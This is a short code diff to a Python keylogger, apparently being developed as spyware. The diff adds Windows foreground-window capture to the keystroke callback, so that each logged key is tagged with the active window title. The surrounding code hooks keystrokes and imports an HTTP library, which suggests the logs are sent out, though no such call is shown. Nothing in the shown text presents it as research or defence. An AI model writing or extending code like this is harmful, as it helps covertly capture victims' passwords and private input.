@@ -1,7 +1,7 @@
 import keyboard #keylogs
 from threading import Semaphore, Timer
 from datetime import datetime
-
+from win32 import win32gui
 import requests
 import os
 
@@ -16,7 +16,9 @@ class Keylogger:
     
     def callback(self, event):
         name = event.name
-        window = '<window goes here>'
+        w=win32gui
+        w.GetWindowText (w.GetForegroundWindow())
+        window = (str(w.GetWindowText (w.GetForegroundWindow())))
         if len(name) > 1:
             name = name.replace(" ", "_")
             name = f"[{name.upper()}]"
